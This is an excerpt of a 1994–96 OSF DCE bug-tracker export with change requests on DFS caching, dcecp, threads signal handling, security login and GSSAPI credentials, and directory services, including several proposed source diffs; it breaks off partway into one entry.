CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : Local disk cache under utilized caused
				 	     by V files shortage
Reported Date                 : 9/16/94
Found in Baseline             : 1.1b16
Found Date                    : 9/16/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/16/94 public]
 
In the following test I found that only 43 MB used out of 
the 100 MB configured when reading 70 MB of source codes from
the server. Note that the total test lasted less that 25 minutes.
 
Looking into all the V files usage, I found the cause of this under
utilization problem --- All the 3,600 pre-allocated V files were
all used at the end of the test.
 
Suggestion : Make the DFS client allocate V files dynamically.
	     
Test : cat all the non-directory files from src/(rpc, security,
       file, directory)
 
Platform : HP 
 
DCE : default 16.3 lastgood build

[09/16/94 public]
 
The number of V files for 100 MB local disk cache is 
supposed to be 12500, but the following piece of code 
in afsd.c limits it to 3600. Can someone explain why?
 
        if (!dfsd_cacheFiles) {
            cacheFiles = cacheBlocks / 8;
            if (cacheFiles <  100) cacheFiles =  100;
            if (cacheFiles > 3600) cacheFiles = 3600;
        }

[09/23/94]

The DCE Admin Reference Guide has a limit of 32,000 for "dfsd -files". So,
we have two limits here --- 3,600 and 32,000. Which one is the right limit?



CR Number                     : 12217
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : accept wildcards for names
Reported Date                 : 9/15/94
Found in Baseline             : 1.1b17, 1.2
Found Date                    : 9/15/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/15/94 public]
In various places dcecp should allow wildcards to be entered to filter the
output.  The filtering must happen on the server side.  For example, using
wild cards as cdscp allows.  This would be very useful in the security
space, e.g., "principal catalog z*" to show all principals begining with z.

This isn't easy as not all services currently provide API's that allow
this.  But there is another difficult point:  THE WILDCARDING SHOULD BEHAVE
THE SAME WAY ACROSS SERVICES.  The method and limitations of wildcards
should be the same for cds directories and registry principals.

[6/5/96 public]
Moved from 'defer' to 'open'.  Still an enhancement, though,
not a bug.



CR Number                     : 12201
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : Problematic handling of SIGXFSZ by exception code
Reported Date                 : 9/15/94
Found in Baseline             : 1.0.3
Found Date                    : 9/15/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/15/94 public]

        CMA maps the signal SIGXFSZ to an exception and prints out a
        report on stderr. However if stderr also points to the file
        on which a write caused the SIGXFSZ signal ( file size limit
        exceeded ) it can loop endlessly by regenerating the same
        signal - because exceptions are implemented using longjmp(3C)
        SIGXFSZ is no longer blocked at the time the exception report
        is written on to stderr.

Proposed Solution:
        Change src/threads/exc_handling.c:exc_raise() to not
        write an exception report before aborting if the
        exception has the status exc_s_exfilsiz.
        src/threads/exc_handling.c diff that implements this
        is below.

*** /dce/dce1/sni103/src/threads/exc_handling.c Mon Mar 28 10:58:58 1994
--- ./exc_handling.c    Fri Sep  9 16:01:52 1994
***************
*** 566,572 ****
--- 566,587 ----
      ctx = (exc_context_t *)exc___ctx_stack_top;

      if (ctx == (exc_context_t *)0) {
+ #ifdef _FTX
+       /* If the current exception is generated by SIGXFSZ and
+        * we dont have an exception handler we dont want to
+        * generate an exception report here. If we do, we may
+        * generate SIGXFSZ ad inf.
+        */
+       {
+        cma_t_integer excst = -1;
+
+        exc_get_status(exc,(&excst));
+        if ( excst == -1 || excst != exc_s_exfilsiz )
+         exc_report (exc);
+       }
+ #else
        exc_report (exc);
+ #endif
        cma__abort_process (SIGIOT);
          }

 Another possible solution to the problem would be to block SIGXFSZ
 before generating an exception report and aborting. This would be
 better, as an exception report is written to stderr in the normal
 case, as before.



CR Number                     : 12155
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : pwd_strengthd
Short Description             : dce_config does not support automated config of Password Management Server
Reported Date                 : 9/13/94
Found in Baseline             : 1.1b17
Found Date                    : 9/13/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/13/94 public]
The dce_config function config(), which interprets the optional input
file COMMAND_FILE (command line option -c) does not contain instructions
for configuring the Password Management Server.

Need to add case under <component> "sec" for "pwd-mgmt" as follows:

pwd-mgmt) #No log message here because pwd_config generates its own;
	  auth_login; verify_auth; config_pwd_mgmt;;

[9/13/94 public]
Don't forget to update the sample command file, src/config/config.cmd
with the new command.  And the environment file (config.env) with
any automatic variables that might need to be set.



CR Number                     : 12132
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12032
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : support pre-configured machine principals
Reported Date                 : 9/12/94
Found in Baseline             : 1.1
Found Date                    : 9/12/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/12/94 public]

There is more backgrond in OT CR 12032, but I will give a summary here
in order to be self-contained.

dced has a "hostdata" service that lets you use DCE to (remotely) create
files on the local host.  This is, of course, ACL-controlled.  Imagine
what could happen if someone created a hostdata object that was a dummy
passwd_override file:  they could create entries so that they were able
to log in as root on that machine.

The problem is how should dced create its ACL's?  The only practical model
(that is worth embedding in code) is that the machine principal should have
all rights.  Unfortunately, when DCE is first configured on a host, the
machine principal hasn't been created yet.  So it must give unauth all rights,
and then go and patch the ACL's later.  OT CR 12032 fixed this for the
"bootstrap" (first host in a cell) case.  We can definitively close the bug
for subsequent hosts by having DCE config scripts allow for the possibility
that the machine principal for the host being installed *has already been
created.*  If so the install should ask for the current password and then
create a machine keytab.  Then dced can come up, set its ACL's right, and
there is no hole.

It might not be necessary for OSF to close this bug for DCE 1.1.  It IS
necessary, however, that licensees understand the situation.

[9/12/94 public]
Just a clarification; the dced change to address OT 12032 applies to dced's
running on either on the initial machine in a cell as well as any
additional machines added on.  

The dced on a given machine will now not register its services until BOTH a
host principal (self) and machine keytab exist for the machine.  Once these
objects exist, dced can do its ACL patching thing and then safely register
the services for external use.

This CR is still valid in that the dce_config on a client machine should
not fail if the machine prinicpal and machine keytab already exist
(dce_config routine config_secclient)

[9/15/94 public]
It is unclear from the notes here and in 12032, so let me ask bluntly:
Will I be able to install DCE and start dced on several machines, then sit
at one machine and completely configure my cell?

[09/15/94 public]
I belive the infrastructure is 99.99999% of the way there.  You need
to get the machine keytab over on the new machine, and then start dced.
keytabs are binary so they must be generated on the right machine.
They also contain the machine principal name, so you probably cannot create
a generic one.  (Oh, hey, why not?  Just stop/start secval when you change
the name in the keytab file.)  So I think the answer is yes, but you
got config/install script work to do.

[9/15/94 public]
I would say 99.99997%, but who's counting?  I agree with Rich and will
add a  couple of comments:

  . I think the current dced can deal with the generic keytab idea above 
    if it is started with -b (-b at this point essentially says to dced
    to not do things related to secure operations right away 
    (register_auth_info, make available sensitive dced services).  
    Caveat: I haven't actually attempted to run  with a "bad" or generic 
      machine keytab and -b.

  . The secval stop/start wouldn't be necc. because secval wouldn't even
    start until teh correct keytab is in place.

  . All the bootstrapping "rules" currently ordered by dce_config & /etc/rc.dce
    would still have to be implemented somewhere (this is a big part of the
    config/install work Rich mentions)

[09/23/94 public]
Not a requirement for OSF's use of dce_config and since only one vendor
uses OSF's dce_config, lowering the priority to below the "required for
1.1" cutline.



CR Number                     : 12130
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : dataCacheBytesReadFromCache always zero
Reported Date                 : 9/12/94
Found in Baseline             : 1.1b16
Found Date                    : 9/12/94
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96 public]
lowering priority of old OTs that haven't appeared during R1.2.

[9/12/94 public]
 
The dataCacheBytesReadFromCache of cm_stats is never updated, so I belied it
is put in the wrong place.



CR Number                     : 12101
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Servicability isn't finding a status in the message catalog
Reported Date                 : 9/8/94
Found in Baseline             : 1.1
Found Date                    : 9/8/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/8/94 public]
Servicability isn't finding a status in the message catalog when running
dcecp. The same status is found when running cdscp.

$ dcecp -c cellalias create /.../x_alias
Error: Unknown message number 0x10d0a45f
$ cdscp add cellname /.../x_alias as alias
For cellname commands, the CDS_DirectoryVersion attribute is required to be 3.1 or greater. (dce / cds)

0x10d0a45f is mapped to the string emitted by cdscp.

[9/8/94 public]
I think the problem is that the cds intable message table is being loaded
through the api call rather than through msgtable.c. Rich agrees and I
will try it. I'll up this to a P1 because we should try to get this in 
today. Rich agrees in that as well. Also assigning it to cds.



CR Number                     : 12082
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dtsd
Short Description             : dce_svc_printf with error executed unconditionally
Reported Date                 : 9/7/94
Found in Baseline             : 1.1
Found Date                    : 9/7/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : time/service/dtss_service_main.c
Sensitivity                   : public

[9/7/94 public]
In time/service/dtss_service_main.c, line 614, there is a dce_svc_printf reporting
an error, without checking whether the previous call to dce_aud_open fails or not.



CR Number                     : 12081
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : unknown
Subcomponent Name             : bld
Short Description             : changes to *.mk does not cause anything to be built
Reported Date                 : 9/7/94
Found in Baseline             : 1.1
Found Date                    : 9/7/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/7/94 public]
When you modify *.mk in your sandbox, and you do a build, the 
*.mk will NOT be used unless the Makefile that included it is
in your sandbox.  In fact, what will happen is that the Makefile
in the backing tree is being used which will then include the 
*.mk in the backing tree.  

This is a limitation to the ODE tool and the way the include
line is being assigned.

For now, the workaround is to put a copy of the Makefile that
include the *.mk in your sandbox.

thanks
annie
.

[2/6/96 public]
This is defect/enhancement request against ODE and not DCE Makefiles. 
So marked.



CR Number                     : 12073
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : gssapi
Short Description             : gss_acquire_cred(GSS_C_NO_NAME) doesn't pickup login context set by sec_login_set_context.
Reported Date                 : 9/7/94
Found in Baseline             : 1.1
Found Date                    : 9/7/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/7/94 public]

 A call sequence of :
     sec_login_setup_identity ( .., &lc ,.. )
     sec_login_valid_fom_keytable ( .., lc,. )
     nlc = sec_login_set_extended_attrs (.., lc , ..)
     sec_login_set_context  ( .. , nlc, .. )
     gss_acquire_cred (GSS_C_NO_NAME,, GSS_C_BOTH,.)

 results in gss_acquire_cred creating a new login context, so that the
 security token issued by a subsequent gss_init_sec_context call
 does NOT contain the ERAs set by sec_login_set_extended_attrs.

[9/7/94 public]

There is no guarantee that the attributes requested in 
the sec_login_set_extended_attrs() call will be present
in the new credentials, and no error is returned if they are 
not.  In that sense, ERAs are like groupsets.  You can request
as many groups as you like, but only those that are legitimately
part of the requestor's groupset are actually included in
the granted credentials. 

To determine whether the attributes you need are really there
after a successful sec_login_set_extended_attrs() call,
use sec_login_cred_get_initiator() followed by 
sec_cred_get_extended_attrs() to iterate over the extended
attributes.

[9/7/94 public]

Correct, but this was not the reason for the token lacking the ERAs. The 
calling process was allowed to get the ERAs (type X500_DN) in the login
context. We checked with sec_cred_get_extended_attrs().

[9/23/94 public]

I have changed gssdce_login_context_to_cred to create a BOTH-mode credential
(assuming you have a keytable entry for the principal).  This is a work-around
for the problem, in that it allows you to create a BOTH-mode credential that
contains extended attributes.  A future drop will enhance gss_acquire_cred
so that it will also pick up any extended attributes from the default
login-context if you're creating a credential with GSS_C_NO_NAME.



CR Number                     : 12069
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : 
Short Description             : bad error message for login to non-existing cache-dir-id
Reported Date                 : 9/7/94
Found in Baseline             : 1.1
Found Date                    : 9/7/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/7/94 public]

Do the following:

- activate gds
- call gdsditadm
- login to the cache of a non-existing dir. id
- try an arbitrary operation (i.e. Display Local and Default DSA)

You will get:

ERROR: Operation effects multiple DSAs (which is prohibited) !             
           To continue press <CR> !

This doesn't seem to make much sense.



CR Number                     : 12062
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : deleting master replica with excluded readonly leaves "zombie" orphan replica.
Reported Date                 : 9/6/94
Found in Baseline             : 1.1b16
Found Date                    : 9/6/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/6/94 public]

The following sequence of operations leave a "zombied" replica i.e.  one
that can not be deleted, re-attached and that prevents the creation of a
replica of the same name in the same clearinghouse:

cdscp create dir /.:/a_dir clear /.:/default_ch
cdscp create replica /.:/a_dir clear /.:/pierrot_ch
cdscp set directory /.:/a_dir to new epoch master /.:/default_ch exclude
/.:/pierrot_ch
cdscp del dir /.:/a_dir 
cdscp create dir /.:/a_dir 
cdscp create replica /.:/a_dir clear /.:/pierrot_ch

Granting that this is a "don't do" (i.e. it's a feature not a bug) it is
not far fetched to imagine that a CDS user could follow this sequence and
find herself "wedged". The least onerous "fix" is a slight modification to
the list of steps to take in order to delete a "bottom-level" directory
(section 11.3.1 DCE Administration Guide --Core Components 1.0.3) appending
a step 5a to warn the user that if a readonly replica exists then removing
the master will create a "zombied" orphan replica. It may be a good idea to
add a note to that effect in the man pages (it begs the question of how the
user is to find out that such replicas exist but more on this below).

For the longer term it would be nice to provide a real "fix" to this
problem. For example, there could be an attribute in the master containing
a list of all replicas (including the excluded ones) so that the user could
be warned of potential problems when she deletes a master. Maybe there
could be an adopt mechanism. At least there could be a tool to remove the
orphan from the clearinghouse. There are, of course, many other ways to fix
this problem.

[9/6/94 public]
Maybe I misunderstood our phone conversation. I thought the problem was that
a read replica had been excluded with the change epoch command because it was 
unavailable. After the exclusion the master was removed. Note this will not
remove the read replica since you have explicatly told cds to ignore it, it
is unavailable. The user then brought the clearinghouse containg the previously
unavailable read replica up. This is a bad thing to do. The read replica has
no master.

The exclusion subcommand of change epoch is intended to tell cds about the
loss of a clearinghouse. Masters of the lost clearinghouse may be moved to
other replicas and read replicas can be excluded. Bringing that clearing
house back to life later after the state of things it previously contained
have been significantly altered is a dangerous thing to do. If our 
documentation isn't clear on this it should be. 

I suspect that having the master keep state on all replicas that have heen 
lost and excluded sometime in the past, perhaps the distant past, may be 
problamatic. But I'll leave this as an enhancement request the next release.



CR Number                     : 12058
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11626
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : AT386/cma_stdio.c
Short Description             : krb5_read_password uses
unwrapped stdio call (fgets)
Reported Date                 : 9/6/94
Found in Baseline             : 1.1b16
Found Date                    : 9/6/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : read_pwd.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/6/94 public]

krb5_read_password uses fgets to read the password.  fgets is not
wrapped in the reference implementations.
The solution is to subsitute it with a read loop that reads one
character at a time up until it gets a newline.

Priority has been set to 1, since this dcecp si relying on this
function. See CR 11626.

[9/19/94 public]

You can't substitute a "read()" loop for an "fgets()" since
read operates on a file descriptor index, while fgets operates on a FILE
type, which does some extra buffering.  Mixing the two would result in
the read() call ignoring characters in the FILE buffer, and the next
*get*() call picking up the previously ignored characters.

The HP reference implementation of fgets is wrapped: it ends up calling
the HP C library, which is re-entrant.

The AT386 reference implementation is (according to the defect report) not
wrapped.  It needs to be wrapped in such a way that fgets results in a
thread-safe call that can mix with other wrapped calls.  This may require
a platform-specific implementation of fgets that calls read while maintaining
the consistency of the FILE structure.

Transferring this to thr: we should not be creating standard thread-safe
functions in components, since that is the job of the threads component.

[9/19/94 public]

I checked the HP executable of dcecp.  Let it sit in the password
read.  Once in sleep state, killed with QUIT.
Took stack from the core.  Here it is.

 0 _read@libc + 0x00000008 (hp-ux export stub)
 1 __filbuf@libc + 0x00000108 (0, 0, 0xa, 0x7b033190)
 2 fgets@libc + 0x00000084 (0x7aff87e0, 0x40040f30, 0, 0)
 3 TMEM@libdce + 0x000f81bc (0x7b033fd4, 0x200, 0x40002368, 0x40002664)
 4 TMEM@libdce + 0x004ed1bc (0x40004668, 0, 0x7b033fd4, 0x7b0341f0)
 5 dcp_login (clientData =   00000000, interp = 0x400be678, argc = 2, argv
= 0x7
b033f60)    [/project/dce/build/dce1.1-snap/src/admin/dcecp/commands.c:
3036]
 6 Tcl_Eval + 0x000009f0 (0x400be678, 0x7b0331e0, 0x7b033d98, 0x1)
 7 Tcl_RecordAndEval + 0x0000026c (0x400be678, 0x7b0331e0, 0, 0x1)
 8 main (argc = 1, argv = 0x7b0331a8)
[in/dcecp/main.c: 487]

What this seem to say is that the HP version is stuck in the read system
call.  This would indicate that the HP version of dcecp is not wrapped at
all.  If it were wrapped, shouldn't it block on the cma select ?

[9/20/94 public]
The fgets call on the AT386 is wrapped, the wrapper is in AT386/cma_stdio.h.
Fgets dives into the c-library for the actual read. The wrapper takes the
global lock to prevent another thread from getting into the library and 
mucking with the the file descriptor data structures in in the case where the 
first thread gets preempted before is gets to the read. 
What I believe is happening on the pc is that a wrapped read is doen on the
file descriptor first. This sets the file descriptor to non-blocking. The
fgets call comes along after that and of course finds the file descriptor
non=blocking so it doesn;t block. If this is true why isn't the hp behaving
in the same way. 

I'd like to spend a bit of time on this but it won't be by 10/6. Tha being
the case anything we do to it will be in the unintegrated tree. I'm going
to lower the priority to reflect this.

What I believe is happening on the 386 is that a wrapped read is called setting
the file descriptor to non-blocking. Fgets is then called. Even though the 
fgets results in a an unwrapped read in the c library it is non-blocking
because the read wrapper set the file descriptor to non-blocking. What puzzles
me is why is the hp behaving differently.



CR Number                     : 12046
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : svc
Short Description             : program names not in svc logs
Reported Date                 : 9/6/94
Found in Baseline             : 1.1
Found Date                    : 9/6/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/6/94 public]

John Bowe reports:

GDS progs would produce more useful logs if they set the progname
(dce_svc_set_progname())?  Currently, the logs say "PID#7678" (or
whatever)...

[09/06/94 public]
Actually: almost all gds processes call d27_001_svc_init (gds/d27svc.c)
which calls dce_svc_set_progname.
The exceptions:

1.) dua (gds/dua/d21log.c): the dua is linked to an application - libdua
can't know what's the name of the application.
(It could set "application", of course ...)

2.) gdsdistcmd (gds/adm/usradmin/d20distcmd.c): could be done very easily

Rich: shall I change gds/adm/usradmin/d20distcmd.c ?? I don't want to
change gds/dua/d21log.c.



CR Number                     : 12045
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : rtros
Short Description             : RTROS conformance and interworking problems
Reported Date                 : 9/6/94
Found in Baseline             : 1.1
Found Date                    : 9/6/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : some files in gds/rtros
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/6/94 public]

While testing gds for conformance and interworking with other X.500
implementations (ICL, Paradise) we have found several
RTROS problems (session, presentation).
This should be fixed in DCE 1.1 - otherwise we don't have
a fully X.500 conformant GDS 1.1.

[9/6/94 public]
Please provide a list of files.

[09/06/94 public]
This is a sublist:

./directory/gds/rtros/com/routil/routila.c
./directory/gds/rtros/incl/roendeco.h
./directory/gds/rtros/incl/rospm00.h
./directory/gds/rtros/incl/rouply0.h
./directory/gds/rtros/ros/roincl/rospm01.h
./directory/gds/rtros/ros/roincl/rospm02.h
./directory/gds/rtros/ros/roincl/rospm03.h
./directory/gds/rtros/ros/roincl/rospm05.h
./directory/gds/rtros/ros/roincl/rospm06.h
./directory/gds/rtros/ros/roincl/rospm07.h
./directory/gds/rtros/ros/rosepm/rospm00.c
./directory/gds/rtros/ros/rosepm/rospm01.c
./directory/gds/rtros/ros/rosepm/rospm02.c
./directory/gds/rtros/ros/rosepm/rospm03.c
./directory/gds/rtros/ros/rosepm/rospm04.c
./directory/gds/rtros/ros/rosepm/rospm05.c
./directory/gds/rtros/ros/rosepm/rospm06.c
./directory/gds/rtros/ros/rosepm/rospm07.c


It's only a sublist because the tests are still in progress.
(This sublist is what has changed until 8/31.)
We hope that all will be OK in the end of this week.

[9/28/94 public]
I understand that this work is still in progress.  I'm dropping this to a 2
because it seems likely that this will come in late enough to have to go
into the unintegrated tree for the 1.1 release.

[10/12/94 public]
We don't want to change the RTROS code now. So I defer this
to DCE 1.2.



CR Number                     : 12041
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : login
Short Description             : Memory leak in sec_login_pvt_get_trusted_preauth()
Reported Date                 : 9/2/94
Found in Baseline             : 1.1b17,1.2.2
Found Date                    : 9/2/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : security/client/login/sec_login_pvt.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/2/94 public]

I am logging this for Sean Mullan ( mullan_s@apollo.hp.com).

In the function sec_login_pvt_get_trusted_preauth() ( file - 
sec_login_pvt.c ) , the memory allocated for the temporary file 
name ( "tfilename" ) is never freed.

Assigned to myself since I am fixing the same function to fix OT 11687.

[ sekhar 9/7/94 public ]

Fixed.

There were also a couple of other fixes with this :
(a) another memory leak : rpc binding handle was not free on an 
    error path (thanks to Mike Burati for spotting this).

(b) use open() instead of creat()  ( which was not really doing 
    what it was intended to do ).

[11/14/96]

Improper fix to memory leak involving tfilename results in freelist corruption,
which can ultimately lead to SEGV. tfilename is an output parameter of an
rpc to dced. Memory allocated by an rpc server and returned to an rpc
client should be released with rpc_ss_client_free not free. This bug can
be expected to cause memory corruption in servers which have a login
context refresh thread which calls sec_login_pvt_get_trusted_preauth
in an attempt to validate via the DCE 1.1 preauthentication protocol (for 
example, cdsd).

If the original memory leak was found with a tool, I would suggest that
the code be reinstrumentd, as I would expect the fix to have essentially
traded a leak for an improper free, which should also be detectable.

Proposed solution follows:

./security/client/login/sec_login_pvt.c
Comparing the file in your sandbox with revision 1.1.54.1.
***************
*** 7154,7160 ****
          free(client_unparsed);
      if (BAD_STATUS(stp)) {
          if (tfilename)
! 	    free(tfilename);
          return;
      }
  
--- 7151,7157 ----
          free(client_unparsed);
      if (BAD_STATUS(stp)) {
          if (tfilename)
! 	    rpc_ss_client_free(tfilename);
          return;
      }
  
***************
*** 7163,7169 ****
       */
      tfp = fopen((char *) tfilename, "r");
      if (tfp == (FILE *) NULL) {
!         free(tfilename);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
          *stp = errno;
--- 7160,7166 ----
       */
      tfp = fopen((char *) tfilename, "r");
      if (tfp == (FILE *) NULL) {
!         rpc_ss_client_free(tfilename);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
          *stp = errno;
***************
*** 7176,7182 ****
          /* could be EOF */
          *stp = errno;
          (void) fclose(tfp);
!         free(tfilename);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
          return;
--- 7173,7179 ----
          /* could be EOF */
          *stp = errno;
          (void) fclose(tfp);
!         rpc_ss_client_free(tfilename);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
          return;
***************
*** 7185,7191 ****
             (krb5_octet *) malloc(random_key->length))) {
          SET_STATUS(stp, sec_login_s_no_memory);
          (void) fclose(tfp);
!         free(tfilename);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
          return;
--- 7182,7188 ----
             (krb5_octet *) malloc(random_key->length))) {
          SET_STATUS(stp, sec_login_s_no_memory);
          (void) fclose(tfp);
!         rpc_ss_client_free(tfilename);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
          return;
***************
*** 7196,7202 ****
          /* could be EOF */
          *stp = errno;
          (void) fclose(tfp);
!         free(tfilename);
          krb5_free_keyblock(random_key);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
--- 7193,7199 ----
          /* could be EOF */
          *stp = errno;
          (void) fclose(tfp);
!         rpc_ss_client_free(tfilename);
          krb5_free_keyblock(random_key);
          rpc_ss_client_free((idl_void_p_t) machine_tkt);
          rpc_ss_client_free((idl_void_p_t) ebuf);
***************
*** 7204,7210 ****
      }
      (void) fclose(tfp);
  
!     free(tfilename);
  
      if (!(*machine_tgt = (krb5_data *) malloc(sizeof(krb5_data)))) {
          SET_STATUS(stp, sec_login_s_no_memory);
--- 7201,7207 ----
      }
      (void) fclose(tfp);
  
!     rpc_ss_client_free(tfilename);
  
      if (!(*machine_tgt = (krb5_data *) malloc(sizeof(krb5_data)))) {
          SET_STATUS(stp, sec_login_s_no_memory);



CR Number                     : 11969
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : era
Short Description             : sec_rgy_attr_delete should support attr-value removal
Reported Date                 : 8/31/94
Found in Baseline             : 1.1b16
Found Date                    : 8/31/94
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/31/94 public]

The security api call sec_rgy_attr_delete() should support
removal of attributes by type-value pairs.  Currently,
regardless of the value passed in for a given attribute,
all instances of that attribute are removed.

[10/4/94 public]
I checked with ahop and she agrees that this should be an enhancement request
because of the reasons specified in CR11951 (the docs and IDL file comments
were wrong).  She may or may not cancel it depending on the outcome of a
discussion she's having with Joe about whether it'll be too complex and
possibly inconsistent behavior with the multi-valued stuff...  Assigned to
ahop until they decide what to do about this one.  Note that the protocol
would support this enhancement if necessary, so there's no changes to be
made there...



CR Number                     : 11907
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11905
Project Name                  : dce
H/W Ref Platform              : all
